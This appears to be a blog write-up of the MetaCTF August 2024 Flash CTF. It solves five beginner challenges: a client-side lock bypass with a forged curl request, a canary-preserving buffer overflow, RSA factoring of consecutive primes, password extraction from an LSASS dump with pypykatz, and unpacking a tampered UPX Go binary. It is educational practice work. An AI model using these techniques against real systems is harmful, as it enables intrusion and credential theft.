@@ -1,0 +1,230 @@
+<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>️🏴 MetaCTF August 2024 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-august-2024-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="️🏴 MetaCTF August 2024 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-august-2024-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2024-08-22T00:00:00+00:00">Published on August 22, 2024</time></small><h1>️🏴 MetaCTF August 2024 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training and TCM Security. There will be 5 challenges and you will have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></blockquote><p>Details here: <a href=https://app.metactf.com/join/aug2024>https://app.metactf.com/join/aug2024</a>.</p><span id=continue-reading></span><h2 id=cracking-the-javashop>Cracking The Javashop</h2><blockquote><p><em>My favorite coffee shop is opening a new website, but they locked it behind a combination lock page! Can you hack the page to get access early?</em><p><em>Access the site <a href=http://host5.metaproblems.com:7510/>here</a></em></blockquote><p>The code for the page contains this:<pre class=language-js data-lang=js style=color:#c0c5ce;background-color:#2b303b><code class=language-js data-lang=js><span>&lt;script>
+</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>wheels </span><span>= document.</span><span style=color:#96b5b4>querySelectorAll</span><span>('</span><span style=color:#a3be8c>.wheel</span><span>');
+</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>correctCombination </span><span>= ['</span><span style=color:#a3be8c>6</span><span>', '</span><span style=color:#a3be8c>8</span><span>', '</span><span style=color:#a3be8c>7</span><span>', '</span><span style=color:#a3be8c>2</span><span>'];
+</span></code></pre><p>Entering that code displays the flag.<p>Equally, the actual server-side check is non-existent:<pre class=language-js data-lang=js style=color:#c0c5ce;background-color:#2b303b><code class=language-js data-lang=js><span style=color:#b48ead>function </span><span style=color:#8fa1b3>checkCombination</span><span>() {
+</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>combination </span><span>= </span><span style=color:#ebcb8b>Array</span><span>.</span><span style=color:#8fa1b3>from</span><span>(</span><span style=color:#bf616a>wheels</span><span>).</span><span style=color:#8fa1b3>map</span><span>(</span><span style=color:#bf616a>wheel </span><span style=color:#b48ead>=> </span><span style=color:#bf616a>wheel</span><span>.</span><span style=color:#bf616a>textContent</span><span>);
+</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>status </span><span>= </span><span style=color:#bf616a>combination</span><span>.</span><span style=color:#8fa1b3>map</span><span>((</span><span style=color:#bf616a>num</span><span>, </span><span style=color:#bf616a>index</span><span>) </span><span style=color:#b48ead>=> </span><span style=color:#bf616a>num </span><span>=== </span><span style=color:#bf616a>correctCombination</span><span>[</span><span style=color:#bf616a>index</span><span>] ? '</span><span style=color:#a3be8c>open</span><span>' : '</span><span style=color:#a3be8c>locked</span><span>');
+</span></code></pre><p>…and sending <code>open</code> for each value also reveals the flag:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> curl http://host5.metaproblems.com:7510/check-combination \
+</span><span>∙</span><span style=color:#bf616a>     --request</span><span> POST \
+</span><span>∙</span><span style=color:#bf616a>     --header </span><span>"</span><span style=color:#a3be8c>Content-Type: application/json</span><span>" \
+</span><span>∙</span><span style=color:#bf616a>     --data-raw </span><span>'</span><span style=color:#a3be8c>{"status":["open","open","open","open"]}</span><span>'
+</span><span style=color:#bf616a>{</span><span>"</span><span style=color:#a3be8c>message</span><span>"</span><span style=color:#bf616a>:</span><span>"</span><span style=color:#a3be8c>MetaCTF{3arly_m0rn1ng_c0ff33_4nd_h4cking}</span><span>"}
+</span></code></pre><h2 id=canary-in-the-bitcoin-mine>Canary in the Bitcoin Mine</h2><blockquote><p><em>To help offset server costs, we at MetaCTF are considering mining some cryptocurrency. We wrote a cool mining program, and we are even offering a flag if you can get to it without hurting the canary!</em><p><em>Download the <a href=https://metaproblems.com/78f8ee1d7105bf8a2e3b3005a96310ca/canary_in_the_bitcoin_mine.c>source code here</a>. When you’re ready, connect to the service with <code>nc host3.metaproblems.com 5980</code></em></blockquote><p>Although <code>mine</code> is defined as having 64 bytes:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>struct </span><span>{
+</span><span>    </span><span style=color:#b48ead>char</span><span> mine[</span><span style=color:#d08770>64</span><span>];
+</span><span>    </span><span style=color:#b48ead>int</span><span> canary;
+</span><span>    </span><span style=color:#b48ead>bool</span><span> earnedFlag;
+</span><span>} mineshaft;
+</span></code></pre><p>…the subsequent <code>gets()</code> doesn’t perform bounds-checking:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#bf616a>gets</span><span>(mineshaft.</span><span style=color:#bf616a>mine</span><span>);
+</span></code></pre><p>The service actually displays the memory layout when executed, including the canary value:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> nc host3.metaproblems.com 5980
+</span><span style=color:#bf616a>Welcome</span><span> to the MetaCTF bitcoin mine, we have a flag you can earn, but it'</span><span style=color:#a3be8c>s guarded by our trusty canary!
+</span><span style=color:#a3be8c>
+</span><span style=color:#a3be8c>Memory layout before input:
+</span><span style=color:#a3be8c>0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span><span style=color:#a3be8c>0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span><span style=color:#a3be8c>0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span><span style=color:#a3be8c>0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+</span><span style=color:#a3be8c>0040  42 49 52 44 00 00 00 00                          BIRD....
+</span></code></pre><p>…so it’s a matter of filling those 64 bytes, leaving <code>BIRD</code> in place and adding a byte afterwards:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>Place some characters into the mine: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIRDX
+</span><span>
+</span><span>Memory layout after input:
+</span><span style=color:#d08770>0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><span>  AAAAAAAAAAAAAAAA
+</span><span style=color:#d08770>0010  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><span>  AAAAAAAAAAAAAAAA
+</span><span style=color:#d08770>0020  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><span>  AAAAAAAAAAAAAAAA
+</span><span style=color:#d08770>0030  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><span>  AAAAAAAAAAAAAAAA
+</span><span style=color:#d08770>0040  42 49 52 44 58 00 00 00</span><span>                          BIRDX...
+</span><span>Canary is alive.
+</span><span>Well done, yo</span><span style=color:#b48ead>u</span><span>'</span><span style=color:#a3be8c>ve earned the flag!
+</span><span style=color:#a3be8c>MetaCTF{g0t_7h3_fl4g_4nd_s4v3d_7h3_canary}
+</span></code></pre><h2 id=loopy-primes>Loopy Primes</h2><blockquote><p><em>What’s better than RSA? 1024 runs of RSA!</em><p><em>We encrypted the flag using <a href=https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/loopy_primes.py>this program</a>, and the output from running the program with the flag is available <a href=https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt>here</a>.</em><p><em>Can you figure out what the original flag was?</em></blockquote><p>The use of consecutive primes, <code>p</code> and <code>q</code>, to determine <code>n</code> is an odd choice:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>p = </span><span style=color:#bf616a>getPrime</span><span>(keysize)
+</span><span>q = </span><span style=color:#bf616a>nextprime</span><span>(p)
+</span><span>n = p*q
+</span></code></pre><p>Thanks to this answer on <a href=https://crypto.stackexchange.com/questions/102979/rsa-exploiting-consecutive-primes><em>RSA: exploiting consecutive primes</em></a> and a <em>lot</em> of reading:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>sys
+</span><span>
+</span><span style=color:#b48ead>from </span><span>math </span><span style=color:#b48ead>import </span><span>isqrt
+</span><span style=color:#b48ead>from </span><span>Crypto.Util.number </span><span style=color:#b48ead>import </span><span>long_to_bytes
+</span><span>
+</span><span>
+</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>factor_n_consecutive_primes</span><span>(</span><span style=color:#bf616a>n</span><span>):
+</span><span>    A = </span><span style=color:#bf616a>isqrt</span><span>(n) + </span><span style=color:#d08770>1
+</span><span>    A += A * A &lt; n
+</span><span>    </span><span style=color:#b48ead>while </span><span style=color:#d08770>True</span><span>:
+</span><span>        B_squared = A * A - n
+</span><span>        B = </span><span style=color:#bf616a>isqrt</span><span>(B_squared)
+</span><span>        </span><span style=color:#b48ead>if </span><span>B * B == B_squared:
+</span><span>            p = A - B
+</span><span>            q = A + B
+</span><span>            </span><span style=color:#b48ead>return </span><span>p, q
+</span><span>        A += </span><span style=color:#d08770>1
+</span><span>
+</span><span>
+</span><span style=color:#b48ead>with </span><span style=color:#96b5b4>open</span><span>("</span><span style=color:#a3be8c>output.txt</span><span>") </span><span style=color:#b48ead>as </span><span>i:
+</span><span>    lines = i.</span><span style=color:#bf616a>read</span><span>().</span><span style=color:#bf616a>splitlines</span><span>()
+</span><span>    n_values = </span><span style=color:#bf616a>list</span><span>(</span><span style=color:#96b5b4>map</span><span>(int, (line.</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>] </span><span style=color:#b48ead>for </span><span>line </span><span style=color:#b48ead>in </span><span>lines[:-</span><span style=color:#d08770>1</span><span>])))
+</span><span>
+</span><span>    ct = </span><span style=color:#bf616a>int</span><span>(lines[-</span><span style=color:#d08770>1</span><span>].</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>])
+</span><span>
+</span><span>E = </span><span style=color:#d08770>65537
+</span><span>
+</span><span style=color:#b48ead>for </span><span>i, n </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>enumerate</span><span>(</span><span style=color:#96b5b4>reversed</span><span>(n_values)):
+</span><span>    p, q = </span><span style=color:#bf616a>factor_n_consecutive_primes</span><span>(n)
+</span><span>    phi = (p - </span><span style=color:#d08770>1</span><span>) * (q - </span><span style=color:#d08770>1</span><span>)
+</span><span>    d = </span><span style=color:#96b5b4>pow</span><span>(E, -</span><span style=color:#d08770>1</span><span>, phi)
+</span><span>    pt = </span><span style=color:#96b5b4>pow</span><span>(ct, d, n)
+</span><span>    ct = pt
+</span><span>    sys.stdout.</span><span style=color:#bf616a>write</span><span>(</span><span style=color:#b48ead>f</span><span>"</span><span style=color:#96b5b4>\r</span><span>{i + </span><span style=color:#d08770>1</span><span>}</span><span style=color:#a3be8c> of </span><span>{</span><span style=color:#96b5b4>len</span><span>(n_values)}")
+</span><span>    sys.stdout.</span><span style=color:#bf616a>flush</span><span>()
+</span><span>sys.stdout.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
+</span><span>
+</span><span style=color:#bf616a>FLAG </span><span>= </span><span style=color:#bf616a>long_to_bytes</span><span>(pt).</span><span style=color:#bf616a>decode</span><span>()
+</span><span style=color:#96b5b4>print</span><span>(</span><span style=color:#bf616a>FLAG</span><span>)
+</span></code></pre><p>…which gives:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> python3 loopy_primes_solution.py
+</span><span style=color:#bf616a>1024</span><span> of 1024
+</span><span style=color:#bf616a>MetaCTF{g0t_d0wn_7o_7h3_root_0f_th3_lo0py_pr1mes</span><span>}
+</span></code></pre><h2 id=mimican-t>Mimican’t</h2><blockquote><p><em>I hacked into a super important system and pulled an LSASS dump!</em><p><em>Unfortunately, I can’t seem to get my tools working properly to analyze it. Can you please help me find the flag in the dump?</em><p><em><a href=https://static.metaproblems.com/4bcbca2f7736d83b7742461661212a9d/lsass.DMP.zip>Download the LSASS dump here</a></em></blockquote><p>Courtesy of this blog on <a href=https://05t3.github.io/posts/DCTF/><em>DCTF 2022</em></a> and after installing <a href=https://github.com/skelsec/pypykatz><code>pypykatz</code></a>:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> pypykatz lsa minidump lsass.DMP | </span><span style=color:#bf616a>rg --max-count</span><span> 1</span><span style=color:#bf616a> --ignore-case</span><span> meta
+</span><span style=color:#bf616a>INFO:pypykatz:Parsing</span><span> file lsass.DMP
+</span><span>                </span><span style=color:#bf616a>password</span><span> MetaCTF{Rice_shirt_rice_money}
+</span></code></pre><p>Note: feeling that this should have been more difficult, I peeked at the writeup. Apparently <code>pypykatz</code> should <em>not</em> have worked but hey-ho…<h2 id=go-vote>Go Vote</h2><blockquote><p><em>Some new company is in charge of making the polling software that will get deployed across polling stations throughout the nation. We’re worried about bad actors trying to reverse the software and figuring out a way to shut down the vote early. Can you take a look yourself?</em><p><em>Here’s the <a href=https://metaproblems.com/d44b8d0af5c73cda02edb81b06d0d145/polling_station>binary</a>.</em></blockquote><p><code>strings</code> suggests that this is packed with UPX:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> strings polling_station | </span><span style=color:#bf616a>rg</span><span> UPX
+</span><span>$</span><span style=color:#bf616a>Info:</span><span> This file is packed with the UPX executable packer http://upx.sf.net $
+</span><span>$</span><span style=color:#bf616a>Id:</span><span> UPX 4.24 Copyright (C) </span><span style=color:#bf616a>1996-2024</span><span> the UPX Team. All Rights Reserved. $
+</span></code></pre><p>…but <code>upx</code> itself complains:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> upx</span><span style=color:#bf616a> -d</span><span> polling_station
+</span><span>                       </span><span style=color:#bf616a>Ultimate</span><span> Packer for eXecutables
+</span><span>                          </span><span style=color:#bf616a>Copyright</span><span> (C) </span><span style=color:#bf616a>1996</span><span> - 2024
+</span><span style=color:#bf616a>UPX</span><span> 4.2.3       Markus Oberhumer, Laszlo Molnar & </span><span style=color:#bf616a>John</span><span> Reiser   Mar 27th 2024
+</span><span>
+</span><span>        </span><span style=color:#bf616a>File</span><span> size         Ratio      Format      Name
+</span><span>   </span><span style=color:#bf616a>--------------------</span><span>   ------   -----------   -----------
+</span><span style=color:#bf616a>upx:</span><span> polling_station: NotPackedException: not packed by UPX
+</span><span>
+</span><span style=color:#bf616a>Unpacked</span><span> 0 files.
+</span></code></pre><p>Apparently this is a <a href=https://cujo.com/blog/upx-anti-unpacking-techniques-in-iot-malware/>thing</a>; in this case, <code>UPX!</code> has been replaced with <code>VOTE</code>:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> xxd polling_station | </span><span style=color:#bf616a>tail -n</span><span> 4
+</span><span style=color:#bf616a>000731e0:</span><span> e280 566d b0b9 879c 0000 0000 0056 4f54  ..Vm.........VOT
+</span><span style=color:#bf616a>000731f0:</span><span> 4500 0000 0000 0000 564f 5445 0e16 0e0a  E.......VOTE....
+</span><span style=color:#bf616a>00073200:</span><span> 9c74 c016 c104 ab61 401c 1600 f831 0700  .t.....a@....1..
+</span><span style=color:#bf616a>00073210:</span><span> 401c 1600 4919 0087 f400 0000            @...I.......
+</span></code></pre><p>…and to fix that:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>with</span><span> open("</span><span style=color:#a3be8c>polling_station</span><span>", "</span><span style=color:#a3be8c>rb</span><span>") </span><span style=color:#bf616a>as</span><span> i:
+</span><span>    </span><span style=color:#bf616a>raw</span><span> = i.read()
+</span><span>
+</span><span style=color:#bf616a>with</span><span> open("</span><span style=color:#a3be8c>polling_station.fixed</span><span>", "</span><span style=color:#a3be8c>wb</span><span>") </span><span style=color:#bf616a>as</span><span> o:
+</span><span>    </span><span style=color:#bf616a>o.write</span><span>(raw.replace(b"</span><span style=color:#a3be8c>VOTE</span><span>", b"</span><span style=color:#a3be8c>UPX!</span><span>"))
+</span></code></pre><p>..which now works:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> upx</span><span style=color:#bf616a> -d</span><span> polling_station.fixed
+</span><span>                       </span><span style=color:#bf616a>Ultimate</span><span> Packer for eXecutables
+</span><span>                          </span><span style=color:#bf616a>Copyright</span><span> (C) </span><span style=color:#bf616a>1996</span><span> - 2024
+</span><span style=color:#bf616a>UPX</span><span> 4.2.3       Markus Oberhumer, Laszlo Molnar & </span><span style=color:#bf616a>John</span><span> Reiser   Mar 27th 2024
+</span><span>
+</span><span>        </span><span style=color:#bf616a>File</span><span> size         Ratio      Format      Name
+</span><span>   </span><span style=color:#bf616a>--------------------</span><span>   ------   -----------   -----------
+</span><span>   </span><span style=color:#bf616a>1452976 </span><span>&lt;-    471580   32.46%   linux/amd64   polling_station.fixed
+</span><span>
+</span><span style=color:#bf616a>Unpacked</span><span> 1 file.
+</span></code></pre><p>Oh dear, it’s <em>Go</em>. IDA’s <em>Functions</em> gives some hint as to what this thing actually does:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>main_main
+</span><span>main_encrypt
+</span><span>main_secureAuthenticate
+</span><span>main_authenticate
+</span><span>main_initiateVotingMenu
+</span><span>main_voidLastVote
+</span><span>main_closeVotingAndTallyVotes
+</span><span>main_beep
+</span><span>main_clear
+</span></code></pre><p><code>main_secureAuthenticate</code> appears to be the point at which a password prompt appears:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#b48ead>lea     </span><span style=color:#bf616a>rsi</span><span>, </span><span style=color:#8fa1b3>off_4D4A10</span><span style=color:#65737e> ; "Enter password: "
+</span></code></pre><p>The instructions in <code>main_main</code> itself reveals two possible passwords:<ul><li><code>gotvsupervisor123</code>, which leads into <code>main_voidLastVote</code><li><code>gotv2024</code>, which leads into <code>main_initiateVotingMenu</code></ul><p>There is, however, another function—<code>main_secureAuthenticate</code>—which does…<em>something</em>.<p>It actually hands off to <code>main_encrypt</code>, which appears to do the gruntwork, eventually making use of <code>crypto_aes_NewCipher</code>: so it’s using AES. Immediately before that, it loads 4 integers<pre class=language-assembly data-lang=assembly style=color:#c0c5ce;background-color:#2b303b><code class=language-assembly data-lang=assembly><span>push    rbp
+</span><span>mov     rbp, rsp
+</span><span>sub     rsp, 0B8h
+</span><span>mov     [rsp+0C0h+arg_8], rbx
+</span><span>mov     [rsp+0C0h+arg_0], rax
+</span><span>mov     rdx, 7620797265762061h
+</span><span>mov     [rsp+0C0h+var_78], rdx
+</span><span>mov     rdx, 7972657620797265h
+</span><span>mov     [rsp+0C0h+var_70], rdx
+</span><span>mov     rdx, 6573207972657620h
+</span><span>mov     [rsp+0C0h+var_68], rdx
+</span><span>mov     rdx, 79656B2074657263h
+</span><span>mov     [rsp+0C0h+var_60], rdx
+</span><span>mov     ecx, 20h ; ' '
+</span><span>lea     rax, [rsp+0C0h+var_78]
+</span><span>mov     rbx, rcx
+</span><span>call    crypto_aes_NewCipher
+</span><span>test    rcx, rcx
+</span><span>jz      short loc_4A20AD
+</span></code></pre><p>…which, when decoded:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>numbers = [
+</span><span>    </span><span style=color:#d08770>0x7620797265762061</span><span>,
+</span><span>    </span><span style=color:#d08770>0x7972657620797265</span><span>,
+</span><span>    </span><span style=color:#d08770>0x6573207972657620</span><span>,
+</span><span>    </span><span style=color:#d08770>0x79656B2074657263</span><span>,
+</span><span>]
+</span><span style=color:#96b5b4>print</span><span>(</span><span style=color:#b48ead>b</span><span>"".</span><span style=color:#bf616a>join</span><span>(number.</span><span style=color:#bf616a>to_bytes</span><span>(</span><span style=color:#d08770>8</span><span>, </span><span style=color:#bf616a>byteorder</span><span>="</span><span style=color:#a3be8c>little</span><span>") </span><span style=color:#b48ead>for </span><span>number </span><span style=color:#b48ead>in </span><span>numbers).</span><span style=color:#bf616a>decode</span><span>())
+</span></code></pre><p>…give <code>a very very very very secret key</code>: so that’s the key then.<p>Heading into the actual algorithm, it does something similar with 2 further integers:<pre class=language-assembly data-lang=assembly style=color:#c0c5ce;background-color:#2b303b><code class=language-assembly data-lang=assembly><span>loc_4A20AD:
+</span><span>mov     [rsp+0C0h+var_40], rbx
+</span><span>mov     [rsp+0C0h+var_50], rax
+</span><span>mov     rcx, [rsp+0C0h+arg_8]
+</span><span>lea     rbx, [rcx+10h]
+</span><span>lea     rax, RTYPE_uint8
+</span><span>mov     rcx, rbx
+</span><span>call    runtime_makeslice
+</span><span>mov     [rsp+0C0h+var_30], rax
+</span><span>movups  [rsp+0C0h+var_88], xmm15
+</span><span>mov     rdx, 3837363534333231h
+</span><span>mov     qword ptr [rsp+0C0h+var_88], rdx
+</span><span>mov     rdx, 3635343332313039h
+</span><span>mov     qword ptr [rsp+0C0h+var_88+8], rdx
+</span><span>mov     rbx, [rsp+0C0h+var_40]
+</span><span>lea     rcx, [rsp+0C0h+var_88]
+</span><span>mov     edi, 10h
+</span><span>mov     rsi, rdi
+</span><span>mov     rax, [rsp+0C0h+var_50]
+</span><span>nop     dword ptr [rax+rax+00h]
+</span><span>call    crypto_cipher_NewCFBEncrypter
+</span></code></pre><p>…which, when run through the same code, produce <code>1234567890123456</code>.<p>After a <em>lot</em> of debugging, the function can be seen to take an array of bytes as input which it later compares to the <em>output</em> of the <code>main_encrypt</code> call (I think).<p>Making a healthy assumption about what those bytes must be and putting all of that together:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>from </span><span>Crypto.Cipher </span><span style=color:#b48ead>import </span><span style=color:#bf616a>AES
+</span><span>
+</span><span>
+</span><span>key = </span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>a very very very very secret key</span><span>"
+</span><span>iv = </span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>1234567890123456</span><span>"
+</span><span>ciphertext = </span><span style=color:#bf616a>bytes</span><span>(
+</span><span>    [
+</span><span>        </span><span style=color:#d08770>0x95</span><span>,
+</span><span>        </span><span style=color:#d08770>0xED</span><span>,
+</span><span>        </span><span style=color:#d08770>0xBB</span><span>,
+</span><span>        </span><span style=color:#d08770>0x79</span><span>,
+</span><span>        </span><span style=color:#d08770>0x1B</span><span>,
+</span><span>        </span><span style=color:#d08770>0x09</span><span>,
+</span><span>        </span><span style=color:#d08770>0xFB</span><span>,
+</span><span>        </span><span style=color:#d08770>0x12</span><span>,
+</span><span>        </span><span style=color:#d08770>0x6C</span><span>,
+</span><span>        </span><span style=color:#d08770>0x49</span><span>,
+</span><span>        </span><span style=color:#d08770>0xBE</span><span>,
+</span><span>        </span><span style=color:#d08770>0x5E</span><span>,
+</span><span>        </span><span style=color:#d08770>0xDB</span><span>,
+</span><span>        </span><span style=color:#d08770>0xBB</span><span>,
+</span><span>        </span><span style=color:#d08770>0x1A</span><span>,
+</span><span>        </span><span style=color:#d08770>0x3E</span><span>,
+</span><span>        </span><span style=color:#d08770>0xB6</span><span>,
+</span><span>        </span><span style=color:#d08770>0xB3</span><span>,
+</span><span>        </span><span style=color:#d08770>0x58</span><span>,
+</span><span>        </span><span style=color:#d08770>0x8D</span><span>,
+</span><span>        </span><span style=color:#d08770>0x89</span><span>,
+</span><span>        </span><span style=color:#d08770>0x3C</span><span>,
+</span><span>        </span><span style=color:#d08770>0x83</span><span>,
+</span><span>        </span><span style=color:#d08770>0x3E</span><span>,
+</span><span>        </span><span style=color:#d08770>0xBF</span><span>,
+</span><span>        </span><span style=color:#d08770>0xFC</span><span>,
+</span><span>        </span><span style=color:#d08770>0xC9</span><span>,
+</span><span>        </span><span style=color:#d08770>0x8A</span><span>,
+</span><span>        </span><span style=color:#d08770>0x86</span><span>,
+</span><span>        </span><span style=color:#d08770>0x98</span><span>,
+</span><span>        </span><span style=color:#d08770>0x3A</span><span>,
+</span><span>        </span><span style=color:#d08770>0xC4</span><span>,
+</span><span>        </span><span style=color:#d08770>0x70</span><span>,
+</span><span>        </span><span style=color:#d08770>0xFB</span><span>,
+</span><span>        </span><span style=color:#d08770>0x51</span><span>,
+</span><span>        </span><span style=color:#d08770>0xDA</span><span>,
+</span><span>        </span><span style=color:#d08770>0x66</span><span>,
+</span><span>        </span><span style=color:#d08770>0x01</span><span>,
+</span><span>        </span><span style=color:#d08770>0xCC</span><span>,
+</span><span>    ]
+</span><span>)
+</span><span>
+</span><span>cipher = AES.</span><span style=color:#bf616a>new</span><span>(</span><span style=color:#bf616a>key</span><span>=key, </span><span style=color:#bf616a>mode</span><span>=</span><span style=color:#bf616a>AES</span><span>.</span><span style=color:#bf616a>MODE_CFB</span><span>, </span><span style=color:#bf616a>iv</span><span>=iv, </span><span style=color:#bf616a>segment_size</span><span>=</span><span style=color:#d08770>128</span><span>)
+</span><span>
+</span><span style=color:#96b5b4>print</span><span>(cipher.</span><span style=color:#bf616a>decrypt</span><span>(ciphertext).</span><span style=color:#bf616a>decode</span><span>())
+</span></code></pre><p>After a <em>lot</em> of failure and <a href=https://github.com/pycrypto/pycrypto/issues/226#issuecomment-317246957>this</a> comment on the now-defunct <a href=https://github.com/pycrypto/pycrypto><code>pycrypto/pycrypto</code></a> repo. I discovered that <code>segment_size</code> has the “wrong” default—amending to the “correct” value of 128 and running the above:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> ./aes.py
+</span><span style=color:#bf616a>MetaCTF{sh0uld_h4v3_u53d_p4p3r_b4ll0ts</span><span>}
+</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-july-2024-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>️🏴 MetaCTF July 2024 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/metactf-november-2024-flash-ctf/> <div class=nav-arrow>Next</div> <span class=post-title>️🏴 MetaCTF November 2024 Flash CTF</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 